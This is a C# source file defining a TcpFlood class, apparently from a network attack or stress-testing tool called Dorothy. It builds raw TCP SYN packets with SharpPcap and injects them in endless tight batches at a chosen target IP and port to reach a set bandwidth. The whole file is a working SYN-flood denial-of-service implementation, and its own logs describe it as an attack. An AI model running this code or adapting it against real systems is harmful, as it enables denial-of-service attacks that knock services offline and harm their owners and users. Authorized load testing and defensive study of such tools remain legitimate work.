using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Threading.Tasks;
using NLog;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;

namespace Dorothy.Models
{
    public class TcpFlood : IDisposable
    {
        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
        private readonly string _sourceIp;
        private readonly PhysicalAddress _sourceMac;
        private readonly string _targetIp;
        private readonly byte[] _targetMac;
        private readonly int _targetPort;
        private readonly long _bytesPerSecond;
        private readonly CancellationToken _cancellationToken;
        private LibPcapLiveDevice? _device;
        private readonly Random _random = new Random();

        public TcpFlood(string sourceIp, byte[] sourceMac, string targetIp, byte[] targetMac, int targetPort, long bytesPerSecond, CancellationToken cancellationToken)
        {
            _sourceIp = sourceIp;
            _sourceMac = new PhysicalAddress(sourceMac);
            _targetIp = targetIp;
            _targetMac = targetMac;
            _targetPort = targetPort;
            _bytesPerSecond = bytesPerSecond;
            _cancellationToken = cancellationToken;
        }

        public async Task StartAsync()
        {
            Logger.Info("Starting TCP SYN Flood attack.");

            try
            {
                _device = CaptureDeviceList.Instance
                    .OfType<LibPcapLiveDevice>()
                    .FirstOrDefault(d => d.Addresses.Any(addr => addr.Addr.ipAddress != null && addr.Addr.ipAddress.ToString() == _sourceIp));

                if (_device == null)
                {
                    Logger.Error("No device found with the specified source IP.");
                    throw new Exception("No device found with the specified source IP.");
                }

                _device.Open(DeviceModes.Promiscuous, 1000);

                if (_device is not IInjectionDevice injectionDevice)
                {
                    Logger.Error($"Device {_device.Name} does not support packet injection.");
                    throw new Exception($"Device {_device.Name} does not support packet injection.");
                }

                var ethernetPacket = new EthernetPacket(
                    _sourceMac,
                    new PhysicalAddress(_targetMac),
                    EthernetType.IPv4);

                var ipPacket = new IPv4Packet(
                    IPAddress.Parse(_sourceIp),
                    IPAddress.Parse(_targetIp))
                {
                    Protocol = ProtocolType.Tcp,
                    TimeToLive = 128
                };

                var tcpPacket = new TcpPacket(
                    6819, // Fixed source port
                    (ushort)_targetPort)
                {
                    Flags = 0x02, // SYN flag
                    WindowSize = 8192,
                    SequenceNumber = 0,
                    PayloadData = new byte[0]
                };

                ipPacket.PayloadPacket = tcpPacket;
                ethernetPacket.PayloadPacket = ipPacket;

                const int FULL_PACKET_SIZE = 54; // Ethernet (14) + IP (20) + TCP (20) = 54 bytes
                long packetsNeededPerSecond = _bytesPerSecond / FULL_PACKET_SIZE;
                int batchSize = 10000;
                // No delay - we want to send as fast as possible to achieve target rate

                Logger.Info($"TCP SYN Flood: Target rate {_bytesPerSecond / 125_000} Mbps " +
                           $"({packetsNeededPerSecond} packets/sec, {batchSize} batch size)");

                await Task.Run(() =>
                {
                    while (!_cancellationToken.IsCancellationRequested)
                    {
                        try
                        {
                            for (int i = 0; i < batchSize && !_cancellationToken.IsCancellationRequested; i++)
                            {
                                injectionDevice.SendPacket(ethernetPacket);
                            }
                        }
                        catch (Exception ex)
                        {
                            Logger.Error(ex, "Failed to send TCP packet.");
                        }
                    }
                    return Task.CompletedTask;
                }, _cancellationToken);
            }
            catch (TaskCanceledException)
            {
                Logger.Info("TCP SYN Flood attack was canceled.");
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "TCP SYN Flood attack failed.");
                throw;
            }
            finally
            {
                _device?.Close();
                Logger.Info("TCP SYN Flood attack stopped.");
            }
        }

        public void Dispose()
        {
            _device?.Dispose();
        }
    }
}
